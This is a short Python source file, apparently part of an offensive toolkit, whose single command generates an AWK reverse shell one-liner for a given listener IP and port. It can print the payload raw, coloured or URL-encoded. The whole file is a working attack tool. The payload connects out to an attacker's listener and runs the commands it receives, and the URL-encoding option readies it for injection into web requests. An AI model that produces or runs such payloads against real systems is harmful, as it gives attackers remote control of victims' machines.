import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return AWK reverse shell"""
    cmd = (f"awk 'BEGIN {{s = \"/inet/tcp/0/{listener_ip}/{listener_port}\"; while(42) {{ "
           f"do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) "
           f"print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}AWK reverse shell:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
